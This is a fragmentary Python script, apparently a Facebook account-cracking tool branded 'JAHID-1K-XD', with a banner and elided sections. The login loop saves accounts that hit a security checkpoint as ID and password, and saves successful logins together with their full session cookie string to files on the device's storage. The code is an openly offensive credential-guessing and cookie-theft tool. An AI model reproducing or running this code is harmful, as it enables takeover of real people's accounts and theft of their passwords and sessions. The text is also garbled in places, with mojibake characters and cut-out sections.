...
#Chnge Name 
	print('[[\x1b[1;92mтАв\x1b[1;97m] [\x1b[1;97mJAHID-1K-XD]')
...
def banner():
 ...
 [тАв] Mr JAHID xd
[тАв] Facebook: MrJAHID-xd
[тАв] Master MindЁЯе║тЭдя╕П                                      '''
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/JAHID-1K/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/JAHID-1K/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
